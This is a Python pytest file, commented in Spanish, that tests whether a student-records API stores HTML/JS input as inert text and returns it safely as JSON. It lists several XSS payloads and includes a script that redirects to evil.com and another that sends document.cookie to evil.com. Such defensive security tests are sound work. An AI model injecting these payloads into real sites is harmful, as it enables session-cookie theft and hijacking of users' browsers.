"""
T32: Tests XSS y sanitización de outputs.

Verifica que datos con HTML/JS almacenados no se ejecutan
al ser retornados por la API.
"""
import pytest
from backend.models import Student, Grade
from backend.tests.conftest import auth


@pytest.fixture(autouse=True)
def reset_rate_limit():
    try:
        from backend.auth.routes import limiter
        limiter.reset()
    except Exception:
        pass
    yield


XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    "javascript:alert('xss')",
    '<iframe src="data:text/html,<script>alert(1)</script>">',
]


class TestXSSInStudentData:
    """XSS en datos de estudiantes almacenados en BD."""

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_student_name_stored_safely(self, db, client, admin_token, payload):
        """Nombres con HTML/JS se almacenan como texto plano."""
        s = Student(id=9000, nombre=payload, carrera="TEST")
        db.add(s)
        db.commit()

        r = client.get("/students/search?q=alert&carrera=TEST", headers=auth(admin_token))
        assert r.status_code == 200
        # La API retorna JSON — el payload NO debe ejecutarse
        # Verificar que la respuesta es JSON válido y el nombre se almacenó tal cual
        data = r.json()
        if data["total"] > 0:
            # El nombre se retorna como string, no se interpreta
            nombre = data["items"][0]["nombre"]
            assert isinstance(nombre, str)

    def test_xss_in_carrera_name(self, db, client, admin_token):
        """Carrera con XSS se almacena como texto plano."""
        xss = '<script>document.location="http://evil.com"</script>'
        s = Student(id=9001, nombre="TEST STUDENT", carrera=xss)
        db.add(s)
        db.commit()

        r = client.get("/dashboard/carreras", headers=auth(admin_token))
        assert r.status_code == 200
        # Las carreras son strings, el XSS no se ejecuta en JSON
        data = r.json()
        assert isinstance(data, list)

    def test_xss_in_intervention_observacion(self, db, client, admin_token, admin_user):
        """Observaciones con XSS en intervenciones."""
        s = Student(id=9002, nombre="SAFE STUDENT", carrera="TEST")
        db.add(s)
        db.commit()

        r = client.post("/interventions/", json={
            "student_id": 9002,
            "tipo": "Llamada",
            "observacion": '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>',
            "resultado": "Contactado",
        }, headers=auth(admin_token))
        # Debe aceptar (es texto) o rechazar (si tiene validación)
        assert r.status_code in (200, 201, 422)
        if r.status_code in (200, 201):
            data = r.json()
            assert isinstance(data.get("observacion", ""), str)


class TestXSSInLoginFlow:
    """XSS en el flujo de autenticación."""

    def test_xss_in_login_email(self, client):
        """Email con XSS no causa problemas."""
        r = client.post("/auth/login", data={
            "username": '<script>alert(1)</script>@test.com',
            "password": "anything",
        })
        # Debe fallar autenticación, no ejecutar
        assert r.status_code in (401, 422)

    def test_xss_in_error_messages(self, client, admin_token):
        """Mensajes de error no reflejan XSS."""
        xss = '<img src=x onerror=alert(1)>'
        r = client.get(f"/students/{xss}/ficha", headers=auth(admin_token))
        # El error no debe contener HTML ejecutable
        assert r.status_code in (404, 422)
        body = r.text
        # Si el payload aparece, debe estar escapado o en JSON
        if xss in body:
            # Está en JSON string, que escapa < > automáticamente
            assert r.headers.get("content-type", "").startswith("application/json")
